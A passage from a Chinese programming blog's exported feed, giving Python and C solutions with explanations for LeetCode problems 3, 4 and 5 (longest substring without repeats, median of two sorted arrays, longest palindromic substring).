<p><img src="https://s2.ax1x.com/2020/02/12/1HWDpt.png" alt="1HWDpt.png"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>二叉搜索树</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解5</title>
    <url>/2020/01/31/LeetCode%E9%A2%98%E8%A7%A35/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第5题，最长回文子串</strong></p>
<p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。</p>
<blockquote>
<p>示例 1：</p>
<p>输入: “babad”<br>输出: “bab”<br>注意: “aba” 也是一个有效答案。</p>
<p>示例 2：</p>
<p>输入: “cbbd”<br>输出: “bb”</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<h3 id="动态规划法："><a href="#动态规划法：" class="headerlink" title="动态规划法："></a>动态规划法：</h3><p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(s)</span><br><span class="line">        bl = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n)]<span class="keyword">for</span> i <span class="keyword">in</span> range(n)]</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = n</span><br><span class="line">        <span class="keyword">for</span> leng <span class="keyword">in</span> range(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(n-leng+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> leng == <span class="number">1</span>:</span><br><span class="line">                    bl[i][i] = <span class="number">1</span></span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (leng == <span class="number">2</span>) &amp; (s[i] == s[i + <span class="number">1</span>]):</span><br><span class="line">                    bl[i][i + <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (bl[i+<span class="number">1</span>][i+leng<span class="number">-2</span>] == <span class="number">1</span>) &amp; (s[i] == s[i+leng<span class="number">-1</span>]):</span><br><span class="line">                    bl[i][i+leng<span class="number">-1</span>] = <span class="number">1</span> </span><br><span class="line">                    start = i</span><br><span class="line">                    end = i + leng</span><br><span class="line">        <span class="keyword">return</span> s[start:end]</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/01/18NKRP.png" alt="18NKRP.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestPalindrome</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">bool</span> token[<span class="number">1000</span>][<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">//题目说明最大长度为1000</span></span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, <span class="built_in">end</span> = n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">1</span> ; len &lt;= n ; len++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= n -len ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">                token[i][i] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((len == <span class="number">2</span>) &amp;&amp; (s[i] == s[i + <span class="number">1</span>]))&#123;</span><br><span class="line">                token[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>((token[i+<span class="number">1</span>][i+len<span class="number">-2</span>] == <span class="number">1</span>) &amp;&amp; (s[i] == s[i+len<span class="number">-1</span>]))&#123;</span><br><span class="line">                token[i][i+len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">                start = i;</span><br><span class="line">                <span class="built_in">end</span> = i + len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s[<span class="built_in">end</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;s[start];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/01/18tvVJ.png" alt="18tvVJ.png"></p>
<h3 id="中心扩散法："><a href="#中心扩散法：" class="headerlink" title="中心扩散法："></a>中心扩散法：</h3><p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getstr</span><span class="params">(self,s,left,right)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> left - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> right &lt; len(s):</span><br><span class="line">            <span class="keyword">if</span> s[left - <span class="number">1</span>] != s[right]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            left -= <span class="number">1</span></span><br><span class="line">            right += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> s[left:right] </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        n = len(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            l = self.getstr(s,i,i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> len(l) &gt;= len(result):</span><br><span class="line">                result = l</span><br><span class="line">            <span class="keyword">if</span> i != n<span class="number">-1</span> <span class="keyword">and</span> s[i] == s[i+<span class="number">1</span>] :</span><br><span class="line">                l = self.getstr(s,i,i+<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">if</span> len(l) &gt;= len(result):</span><br><span class="line">                    result = l          </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/04/10bXpq.png" alt="10bXpq.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">longestPalindrome</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(s), start = <span class="number">0</span>, <span class="built_in">end</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123; <span class="comment">//奇数</span></span><br><span class="line">        <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">            left--;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">            start = left + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">end</span> = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123; <span class="comment">//偶数</span></span><br><span class="line">        <span class="keyword">if</span>(s[i] == s[i + <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">                left--;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">                start = left + <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">end</span> = right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    s[<span class="built_in">end</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;s[start];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/03/1NYoZT.png" alt="1NYoZT.png"></p>
<h3 id="解析："><a href="#解析：" class="headerlink" title="解析："></a>解析：</h3><p>​    <strong>无论是动态规划法还是中心扩散法，理论上他们的时间复杂度都应该是O(n^2)​。</strong></p>
<h4 id="关于动态规划："><a href="#关于动态规划：" class="headerlink" title="关于动态规划："></a>关于动态规划：</h4><p>是有一个二维布尔数组<code>bool_list[i][j]</code>，若值为1，则表示字符串中 i 位到 j 位构成回文子串。</p>
<p>动态规划中首先遍历长度leng，每次再遍历字符串，观察是否具有长度为leng的回文子串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> len = <span class="number">1</span> ; len &lt;= n ; len++) <span class="comment">//leng从1开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= n -len ; i++) <span class="comment">//每次遍历到字符串的n-leng位</span></span><br></pre></td></tr></table></figure>

<p>其中<code>boollist[i][j]</code>,若<code>i = j</code>，则恒为1，因为字符串始终具有长度为1的回文子串。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">    token[i][i] = <span class="number">1</span>;</span><br><span class="line">    start = i;</span><br><span class="line">    <span class="built_in">end</span> = i + <span class="number">1</span>;</span><br><span class="line">   	<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时回文子串也有奇数和偶数之分，奇数的回文字串中心为一个字符，而偶数的回文子串中心是两个相同的字符。所以当leng为2时要考虑偶数回文子串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((len == <span class="number">2</span>) &amp;&amp; (s[i] == s[i + <span class="number">1</span>]))&#123;</span><br><span class="line">    token[i][i+<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">	start = i;</span><br><span class="line"> 	<span class="built_in">end</span> = i + <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>剩下就可以通解了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((token[i+<span class="number">1</span>][i+len<span class="number">-2</span>] == <span class="number">1</span>) &amp;&amp; (s[i] == s[i+len<span class="number">-1</span>]))&#123;</span><br><span class="line">    token[i][i+len<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">    start = i;</span><br><span class="line">    <span class="built_in">end</span> = i + len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为一个回文子串所具有的性质就是，每个元素和它的对称位置元素相同，且它俩中间包裹的子串也肯定时回文子串。</p>
<h4 id="关于中心扩散："><a href="#关于中心扩散：" class="headerlink" title="关于中心扩散："></a>关于中心扩散：</h4><p>其实，我们也可以这样找回文：</p>
<p>​    遍历字符串每个元素，从每个元素出发，查看它两边的元素是否相等，相等则查看更外层两边元素是否相等，如此重复，直到不相等，则返回找到的奇数回文子串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123; <span class="comment">//奇数</span></span><br><span class="line">    <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">        left--;</span><br><span class="line">        right++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">        start = left + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">end</span> = right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    而偶数回文子串的寻找，和上述相似，只不过在最开始的中心元素是两个相等的元素，或者说是一条线为中心开始，向两边扩散：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123; <span class="comment">//偶数</span></span><br><span class="line">    <span class="keyword">if</span>(s[i] == s[i + <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">int</span> left = i - <span class="number">1</span>, right = i + <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &gt;= <span class="number">0</span> &amp;&amp; right &lt; n &amp;&amp; s[left] == s[right])&#123;</span><br><span class="line">            left--;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right - left - <span class="number">1</span> &gt; <span class="built_in">end</span> - start)&#123;</span><br><span class="line">            start = left + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">end</span> = right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：要找到最大回文子串的话，可以在找到回文子串时和之前找到的最大回文子串长度比较，若大于则更新，若小于则不变。</strong></p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解4</title>
    <url>/2020/01/30/LeetCode%E9%A2%98%E8%A7%A34/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第4题，寻找两个有序数组的中位数</strong></p>
<p>给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。</p>
<p>请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 <strong>O(log(m + n))</strong>。</p>
<p>你可以假设 nums1 和 nums2 不会同时为空。</p>
<blockquote>
<p>示例 1:</p>
<p>nums1 = [1, 3]<br>nums2 = [2]</p>
<p>则中位数是 2.0</p>
<p>示例 2:</p>
<p>nums1 = [1, 2]<br>nums2 = [3, 4]</p>
<p>则中位数是 (2 + 3)/2 = 2.5</p>
</blockquote>
<a id="more"></a>

<p>原题如上，解法如下：</p>
<p><strong>python版</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getk</span><span class="params">(self,nums1,start1,nums2,start2,n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> start1 &gt;= len(nums1):</span><br><span class="line">            <span class="keyword">return</span> nums2[start2 + n - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> start2 &gt;= len(nums2):</span><br><span class="line">            <span class="keyword">return</span> nums1[start1 + n - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> min(nums1[start1],nums2[start2])</span><br><span class="line">        half = min(int(n/<span class="number">2</span>),min(len(nums1)-start1,len(nums2)-start2))</span><br><span class="line">        <span class="keyword">if</span> nums1[start1 + half - <span class="number">1</span>] &lt; nums2[start2 + half - <span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> self.getk(nums1, start1 + half, nums2, start2, n - half)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.getk(nums1, start1 , nums2, start2 + half, n - half)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span><span class="params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums1: List[int]</span></span><br><span class="line"><span class="string">        :type nums2: List[int]</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        left = int((len(nums1)+len(nums2)+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">        right = int((len(nums1)+len(nums2)+<span class="number">2</span>)/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> (self.getk(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,left) + self.getk(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,right))*<span class="number">0.5</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/30/1Qz3E8.png" alt="1Qz3E8.png"></p>
<p><strong>c语言版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getk</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span> start1, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size, <span class="keyword">int</span> start2, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(start1 &gt;= nums1Size)</span><br><span class="line">        <span class="keyword">return</span> nums2[start2 + n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(start2 &gt;= nums2Size)</span><br><span class="line">        <span class="keyword">return</span> nums1[start1 + n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(nums1[start1], nums2[start2]);</span><br><span class="line">    <span class="keyword">int</span> half = <span class="built_in">min</span>(n/<span class="number">2</span>,<span class="built_in">min</span>(nums1Size - start1, nums2Size - start2));</span><br><span class="line">    <span class="keyword">if</span>(nums1[start1 + half - <span class="number">1</span>] &lt; nums2[start2 + half - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> getk(nums1, nums1Size, start1 + half, nums2, nums2Size, start2, n - half);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getk(nums1, nums1Size, start1, nums2, nums2Size, start2 + half, n - half);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = (nums1Size + nums2Size + <span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> right = (nums1Size + nums2Size + <span class="number">2</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> (getk(nums1, nums1Size, <span class="number">0</span>, nums2, nums2Size, <span class="number">0</span>, left) + getk(nums1, nums1Size, <span class="number">0</span>, nums2, nums2Size, <span class="number">0</span>, right))/<span class="number">2.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/30/1lWTWF.png" alt="1lWTWF.png"></p>
<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这道题目是一个LeetCode难度为困难的题目</p>
<p>但是单看题目会发现很简单，无非可以用到归并排序形成新数组，然后根据新数组长度的奇偶取中位数</p>
<p><strong>但是题目要求的时间复杂度为log(m+n)，而归并排序的时间复杂度为(m+n)，所以这就是这个题目的难点</strong></p>
<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>使用二分法和递归</p>
<p>首先，我们先解决以下(m+n)的奇偶数问题，即对奇数来说中位数就是数组的第(m+n+1)/2位，而对于偶数来说，中位数就是(m+n)/2位和((m+n)/2)+1位的加和平均。其实可以将奇偶数放在一起考虑，即可以算出<code>int((m+n+1)/2)和int((m+n+2)/2)</code>的加和平均。对奇数和偶数来说都可以适用。</p>
<p>所以只要找到在两个有序数组排序组合后的第int((m+n+1)/2)个值和第int((m+n+2)/2)值就可以。</p>
<p>所以问题就划归为在两个有序数组中找第k值问题。</p>
<p>如果我们一个一个取比较，即归并排序后再去找k值，那么时间复杂度(m+n)，为了使时间复杂度为log(m+n)我们要用到二分法和递归：即我们可以一半一半的排除寻找。</p>
<h2 id="构造getk函数："><a href="#构造getk函数：" class="headerlink" title="构造getk函数："></a>构造getk函数：</h2><p>已知nums1和nums2 ，设nums = nums1 $ nums2</p>
<p>符号$的定义是<code>sorted(nums1+nums2)</code></p>
<p>示意图：</p>
<p>nums1 = [1, 3, 6, 7] </p>
<p>nums2 = [2, 4, 5, 8]</p>
<p>k = 7   k/2 = 3(向下取整)  start1 = 0        start2 = 0</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lbtts.png" alt="1lbtts.png"></p>
<p>如图 nums1[3 - 1] &gt; nums2[3 - 1]，则就可以推断2，4，5都小于nums[7-1]，即都可以舍去</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lbDnU.png" alt="1lbDnU.png"></p>
<p>k = 7 - 3 = 4    k/2 = 2  start1 = 0 start2 = 3</p>
<p>如图 nums1[2 - 1] &lt; nums2[3 + 2 - 1]，则可以判断1，3都小于nums[7-1]，即都可以舍去</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lvoHf.png" alt="1lvoHf.png"></p>
<p>k = 4 - 2    k/2 = 1    start1 = 2  start2 = 3</p>
<p>如图 nums1[2 + 1 -1] &lt; nums2[3 + 1 -1]，则可以判断6小于nums[7 - 1]，即可以舍去。</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lzJW4.png" alt="1lzJW4.png"></p>
<p>k = 2 -1 start1 = 3 start2 = 3</p>
<p>此时k = 1 即就是在两个数组中没有舍弃的数字中找到最小的数字，比较nums1[3 - 1]和nums2[3 - 1]取最小值就是我们开始要取的getk了</p>
<p>以上就是对一般情况下的求取，现在讨论特殊情况：</p>
<ol>
<li>nums1 || nums2 == none</li>
<li>len(nums1) &lt; k/2 or len(nums2) &lt; k/2</li>
<li>在递归时 k/2 &gt; len(nums1) - start1 or k/2 &gt; len(nums2) - start2</li>
</ol>
<p>其实上述可以用一种特殊情况总结，即</p>
<p><code>start1 &gt;= len(nums1) or start2 &gt;= len(nums2)</code></p>
<p><img src="https://s2.ax1x.com/2020/01/30/11VJMT.png" alt="11VJMT.png"></p>
<p>此时则<code>return nums2[start2 + k -1]</code></p>
<p>这种特殊情况总伴随者下述：</p>
<p><img src="https://s2.ax1x.com/2020/01/30/11VWod.png" alt="11VWod.png"></p>
<p>即剩下的数字不足以二分法，则此时选取最小能舍去的步数，则每次判断可舍去的步数可用如下来求取：</p>
<p><code>half = min(int(n/2),min(len(nums1)-start1,len(nums2)-start2))</code></p>
<p>使用递归来求取k位值，每次可以舍去half个值，则剩下问题就是求取剩下数组们的k-half位值，知道问题缩小到求取的值为1位，则此时就返回<code>return min(nums1[start1-1],nums2[start2-1])</code></p>
<p>其中start1和start2是变化的，即如果在上次舍去nums1数组half个值时，start1 = start1 +half，start2同理</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解3</title>
    <url>/2020/01/27/LeetCode%E9%A2%98%E8%A7%A33/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第3题，无重复字符的最长字串</strong></p>
<p>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。</p>
<blockquote>
<p>示例 1:</p>
<p>输入: “abcabcbb”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。</p>
<p>示例 2:</p>
<p>输入: “bbbbb”<br>输出: 1<br>解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。</p>
<p>示例 3:</p>
<p>输入: “pwwkew”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “wke”，所以其长度为 3。<br>请注意，你的答案必须是 子串 的长度，”pwke” 是一个子序列，不是子串。</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        sw = []</span><br><span class="line">        l = []</span><br><span class="line">        m = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> sw:</span><br><span class="line">                l.append(len(sw))</span><br><span class="line">                <span class="keyword">while</span> sw[<span class="number">0</span>] != i:</span><br><span class="line">                    sw.pop(<span class="number">0</span>)</span><br><span class="line">                sw.pop(<span class="number">0</span>)</span><br><span class="line">                sw.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sw.append(i)</span><br><span class="line">        l.append(len(sw))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> l:</span><br><span class="line">            <span class="keyword">if</span> j &gt; m:</span><br><span class="line">                m = j</span><br><span class="line">        <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/27/1uRWHU.png" alt="1uRWHU.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, <span class="built_in">end</span> = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">end</span> &lt; <span class="built_in">strlen</span>(s))&#123;</span><br><span class="line">        <span class="keyword">int</span> c = s[<span class="built_in">end</span>] - <span class="string">' '</span>;</span><br><span class="line">        <span class="keyword">while</span>(a[c]&gt;<span class="number">0</span>)&#123; <span class="comment">//表示出现重复元素</span></span><br><span class="line">            a[s[start]-<span class="string">' '</span>]--; <span class="comment">//逐个删除start表示的元素在窗口中的出现</span></span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        a[c]++;</span><br><span class="line">        <span class="built_in">end</span>++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">end</span> - start &gt; <span class="built_in">max</span>)&#123;</span><br><span class="line">            <span class="built_in">max</span> = <span class="built_in">end</span> - start;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">end</span> -start &gt; <span class="built_in">max</span>)&#123;</span><br><span class="line">        <span class="built_in">max</span> = <span class="built_in">end</span> - start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/27/1uhG9J.png" alt="1uhG9J.png"></p>
<p><strong>解析：</strong></p>
<ol>
